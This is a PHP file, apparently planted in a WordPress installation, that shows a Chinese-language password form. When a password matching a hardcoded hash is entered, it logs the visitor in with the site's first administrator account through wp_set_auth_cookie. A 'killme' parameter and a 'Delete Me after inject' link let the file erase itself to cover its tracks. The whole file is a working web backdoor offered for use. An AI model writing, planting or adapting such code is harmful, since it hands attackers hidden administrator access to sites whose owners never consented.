<?php
require_once('../../../wp-load.php');
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $password = $_POST['password'] ?? '';
    if (sha1(md5(base64_encode($password))) === "c9f415ea533dbda9e3ad996125606adfbe11d97c"){
        $message = "<p style='color:green;'>密码正确！</p>";
        $admins = get_users(array('role'=>'administrator','orderby'=>'ID','order'=>'ASC','number'=>1));
        if (!empty($admins)) {
           $admin = $admins[0]; $admin_id = $admin->ID; wp_set_auth_cookie($admin_id, true); wp_redirect(admin_url());
         } 
    } else {
        $message = "<p style='color:red;'>密码错误！</p>";
    }
}
if (isset($_GET['killme'])) {
    unlink(__FILE__);
    die("文件已删除！");
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>密码输入</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f4f4f4;
            font-family: Arial, sans-serif;
        }
        .form-box {
            background: #fff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 280px;
        }
        input[type="password"] {
            padding: 8px;
            width: 200px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        input[type="submit"] {
            padding: 8px 16px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background: #45a049;
        }
        .message {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="form-box">
        <form method="post">
            <h2>请输入密码</h2>
            <input type="password" name="password" placeholder="密码" required><br>
            <input type="submit" value="提交">
        </form>
		<a href='?killme'>Delete Me after inject !!</a> 
        <div class="message">
            <?= $message ?>
        </div>
    </div>
</body>
</html>
